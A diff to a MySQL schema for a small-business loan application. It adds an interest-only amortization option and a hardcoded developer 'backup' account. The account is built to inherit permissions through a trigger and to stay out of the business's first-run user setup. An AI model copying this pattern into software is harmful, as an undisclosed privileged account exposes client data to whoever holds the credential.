@@ -214,7 +214,8 @@ CREATE TABLE prestamo (
   tasa_interes        DECIMAL(8,4)  NOT NULL,     -- % mensual, ej. 10.0000
   plazo_cuotas        INT UNSIGNED  NOT NULL,
   modalidad           ENUM('diaria','semanal','quincenal','mensual','pago_unico') NOT NULL,
-  metodo_amortizacion ENUM('frances','cuota_fija') NOT NULL DEFAULT 'cuota_fija',
+  -- solo_interes (021): prestamo ABIERTO, paga solo interes y el capital queda abierto
+  metodo_amortizacion ENUM('frances','cuota_fija','solo_interes') NOT NULL DEFAULT 'cuota_fija',
   fecha_inicio        DATE          NOT NULL,     -- fecha del primer pago (hora local del negocio)
   garantia            VARCHAR(255)  NULL,
   estado              ENUM('activo','pagado','cancelado') NOT NULL DEFAULT 'activo',
@@ -635,3 +636,25 @@ BEGIN
 END$$
 
 DELIMITER ;
+
+-- =============================================================
+-- CUENTA DE RESPALDO DEL DESARROLLADOR (020)
+--
+-- Va DESPUES de los triggers a proposito: el trigger de INSERT es el que le
+-- copia los permisos del rol. Si esta fila naciera antes, la cuenta quedaria
+-- sin ni un permiso.
+--
+-- El wizard de primer arranque IGUAL aparece: la app pregunta por usuarios del
+-- negocio y esta cuenta (rol Programador) no cuenta para eso.
+-- La contrasena va solo como hash BCrypt cost 12; en claro esta unicamente en
+-- el MD privado del desarrollador. Ver 020_usuario_programador.sql para el
+-- detalle y las advertencias.
+-- =============================================================
+INSERT INTO usuario (username, password_hash, nombre, apellido, rol_id, activo)
+SELECT 'Yub',
+       '$2a$12$JVW4T7UnLXu.n6k2f13N6.vQj3jShwGDVBegNh8HqTrC80yQZjie6',
+       'Yuber', 'Santana',
+       (SELECT id FROM rol WHERE nombre = 'Programador' AND modo IS NULL LIMIT 1),
+       1
+FROM DUAL
+WHERE EXISTS (SELECT 1 FROM rol WHERE nombre = 'Programador' AND modo IS NULL);
